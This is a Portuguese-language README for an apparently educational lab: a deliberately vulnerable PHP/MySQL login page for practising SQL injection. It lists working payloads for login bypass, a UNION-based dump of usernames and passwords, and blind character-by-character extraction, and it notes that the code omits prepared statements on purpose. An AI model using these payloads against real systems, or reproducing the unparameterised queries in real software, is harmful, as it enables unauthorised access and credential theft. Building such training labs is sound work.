# 🚨 SQL Injection Testing Web Page

**Projeto educativo** que demonstra vulnerabilidades de SQL Injection em um sistema de login PHP/MySQL.  

⚠️ **AVISO**: Use APENAS para fins de aprendizado em ambientes controlados. Nunca implante este código em produção.

## 🛠 Tecnologias
- PHP (sem prepared statements)
- MySQL/MariaDB
- HTML/CSS básico

## ⚙️ Como Funciona
O sistema contém vulnerabilidades intencionais que permitem:

```diff
+ Bypass de autenticação
+ Extração de dados sensíveis
+ Execução arbitrária de queries
- Proteções intencionalmente ausentes
```

---
## 🚀 Como Usar

### Pré-requisitos
- XAMPP/WAMP/LAMP instalado
- PHP 7.4+ e MySQL 5.7+

### Instalação
1. Clone o repositório:
```bash
git clone https://github.com/tiago4lex/sqlinjection-testingwebpage.git
```

2. Importe o banco de dados:
```sql
mysql -u root -p < database.sql
```

3. Coloque os arquivos na pasta `htdocs` do seu servidor local
4. Execute o servidor

---
### Testes de SQL Injection

Tente estes exemplos no campo de usuário/senha:

| Tipo de Ataque  | Payload                                                                                | Resultado Esperado            |
| --------------- | -------------------------------------------------------------------------------------- | ----------------------------- |
| Bypass de Login | `admin' --`                                                                            | Acesso como admin sem senha   |
| Dump de Dados   | `' UNION SELECT 1,username,password,4 FROM users --`                                   | Lista todos os usuários       |
| Blind Injection | `admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --` | Teste caractere por caractere |

---
## 📂 Estrutura do Projeto

```text
/sql-injection-lab
├── index.html          # Página de login
├── login.php           # Lógica de autenticação (vulnerável)
├── dashboard.php       # Área restrita (mostra dados sensíveis)
├── logout.php          # Encerra sessão
├── database.sql        # Script do banco de dados com dados de teste
└── README.md           # Este arquivo
```

## ⚠️ Avisos Importantes

- ❌ Nunca use este código em sistemas reais
- 🔒 Execute apenas em localhost ou ambientes isolados
- 📜 Consulte as leis de segurança digital da sua região antes de testar em qualquer sistema

## ✨ Contribuição

Contribuições são bem-vindas! Abra uma issue para:

- Reportar falsos positivos/negativos
- Sugerir novos vetores de ataque
- Melhorar a interface de testes

## 📚 Recursos Educativos

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [SQL Injection for Beginners](https://www.w3schools.com/sql/sql_injection.asp)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)

---
✍️ **Nota do Autor**:  
Este projeto foi criado para conscientização sobre segurança digital. Use o conhecimento de forma ética!